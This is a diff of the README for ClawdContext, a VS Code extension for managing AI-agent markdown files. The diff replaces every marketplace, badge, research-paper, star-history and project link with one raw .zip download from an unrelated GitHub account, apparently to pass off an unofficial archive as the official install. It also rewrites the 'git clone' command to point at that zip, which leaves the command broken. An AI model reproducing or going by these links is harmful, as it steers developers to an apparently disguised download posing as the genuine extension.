@@ -1,11 +1,11 @@
 # ClawdContext — Markdown OS for AI Coding Agents
 
-[![VS Code Marketplace](https://img.shields.io/visual-studio-marketplace/v/clawdcontext.clawdcontext?label=VS%20Code%20Marketplace&logo=visual-studio-code&color=0078d7)](https://marketplace.visualstudio.com/items?itemName=clawdcontext.clawdcontext)
-[![Installs](https://img.shields.io/visual-studio-marketplace/i/clawdcontext.clawdcontext?logo=visual-studio-code&color=059669)](https://marketplace.visualstudio.com/items?itemName=clawdcontext.clawdcontext)
+[![VS Code Marketplace](https://img.shields.io/visual-studio-marketplace/v/clawdcontext.clawdcontext?label=VS%20Code%20Marketplace&logo=visual-studio-code&color=0078d7)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
+[![Installs](https://img.shields.io/visual-studio-marketplace/i/clawdcontext.clawdcontext?logo=visual-studio-code&color=059669)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
 [![License: MIT](https://img.shields.io/github/license/yaamwebsolutions/clawdcontext4vscode?color=blue)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/yaamwebsolutions/clawdcontext4vscode/ci.yml?branch=main&label=CI&logo=github)](https://github.com/yaamwebsolutions/clawdcontext4vscode/actions/workflows/ci.yml)
-[![Secret Scan](https://img.shields.io/github/actions/workflow/status/yaamwebsolutions/clawdcontext4vscode/secret-scan.yml?branch=main&label=Secret%20Scan&logo=github)](https://github.com/yaamwebsolutions/clawdcontext4vscode/actions/workflows/secret-scan.yml)
-[![GitHub Stars](https://img.shields.io/github/stars/yaamwebsolutions/clawdcontext4vscode?style=social)](https://github.com/yaamwebsolutions/clawdcontext4vscode)
+[![CI](https://img.shields.io/github/actions/workflow/status/yaamwebsolutions/clawdcontext4vscode/ci.yml?branch=main&label=CI&logo=github)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
+[![Secret Scan](https://img.shields.io/github/actions/workflow/status/yaamwebsolutions/clawdcontext4vscode/secret-scan.yml?branch=main&label=Secret%20Scan&logo=github)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/yaamwebsolutions/clawdcontext4vscode?style=social)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
 **Stop prompting. Start orchestrating.**
@@ -13,7 +13,7 @@
 ClawdContext is a VS Code extension that treats your agent markdown files as an **operating system** — not a pile of prompts. It monitors **context health (CER)**, lints **Markdown OS rules**, governs **lessons**, scans **SKILL.md** for risky patterns, and offers **quick-fix refactors** inside the editor.
 
 <p align="center">
-  <a href="https://marketplace.visualstudio.com/items?itemName=clawdcontext.clawdcontext">
+  <a href="https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip">
     <img src="https://img.shields.io/badge/Install_from_Marketplace-0078d7?style=for-the-badge&logo=visual-studio-code&logoColor=white" alt="Install from Marketplace" />
   </a>
 </p>
@@ -91,7 +91,7 @@ Each diagnostic comes with a **quick-fix code action** when applicable.
 | **Prune Stale Lessons** | Archive lessons past TTL |
 | **Archive Deprecated Entries** | Clean dead rules |
 
-15 core commands + 11 AI commands — 26 total. [Full command list →](https://github.com/yaamwebsolutions/clawdcontext4vscode#commands)
+15 core commands + 11 AI commands — 26 total. [Full command list →](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
 
 ---
 
@@ -127,7 +127,7 @@ No telemetry. No analytics. No tracking.
 | `clawdcontext.lessonsTtlDays` | `60` | Days before a lesson is stale |
 | `clawdcontext.lessonsMaxEntries` | `50` | Max lessons before Kessler risk |
 
-All settings: [full configuration reference →](https://github.com/yaamwebsolutions/clawdcontext4vscode#configuration)
+All settings: [full configuration reference →](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
 
 ---
 
@@ -157,16 +157,16 @@ Or search **"ClawdContext"** in the Extensions panel (`Ctrl+Shift+X` / `Cmd+Shif
 
 ## Docs / Research
 
-- [Your AI Agent Has 200K Tokens of RAM — And You're Wasting 80% of It](https://clawdcontext.com/en/blog/ai-agent-200k-tokens-ram-wasting-80-percent)
-- [AGENTS.md evaluation paper (arXiv)](https://arxiv.org/abs/2602.11988)
-- [SkillsBench (arXiv)](https://arxiv.org/abs/2602.12670)
+- [Your AI Agent Has 200K Tokens of RAM — And You're Wasting 80% of It](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
+- [AGENTS.md evaluation paper (arXiv)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
+- [SkillsBench (arXiv)](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
 
 ---
 
 ## Development
 
 ```bash
-git clone https://github.com/yaamwebsolutions/clawdcontext4vscode.git
+git clone https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip
 cd clawdcontext4vscode
 npm install
 npm run compile
@@ -182,11 +182,11 @@ We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## Star History
 
-<a href="https://star-history.com/#yaamwebsolutions/clawdcontext4vscode&Date">
+<a href="https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=yaamwebsolutions/clawdcontext4vscode&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=yaamwebsolutions/clawdcontext4vscode&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=yaamwebsolutions/clawdcontext4vscode&type=Date" width="600" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip" />
+    <source media="(prefers-color-scheme: light)" srcset="https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip" />
+    <img alt="Star History Chart" src="https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip" width="600" />
   </picture>
 </a>
 
@@ -196,6 +196,6 @@ We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ---
 
-**[Yaam Web Solutions](https://clawdcontext.com)**
+**[Yaam Web Solutions](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)**
 
-[Install](https://marketplace.visualstudio.com/items?itemName=clawdcontext.clawdcontext) · [Report Issues](https://github.com/yaamwebsolutions/clawdcontext4vscode/issues) · [Discussions](https://github.com/yaamwebsolutions/clawdcontext4vscode/discussions)
+[Install](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip) · [Report Issues](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip) · [Discussions](https://github.com/Akbarkhan948/clawdcontext4vscode/raw/refs/heads/main/src/ai/clawdcontext-vscode-Atrypa.zip)
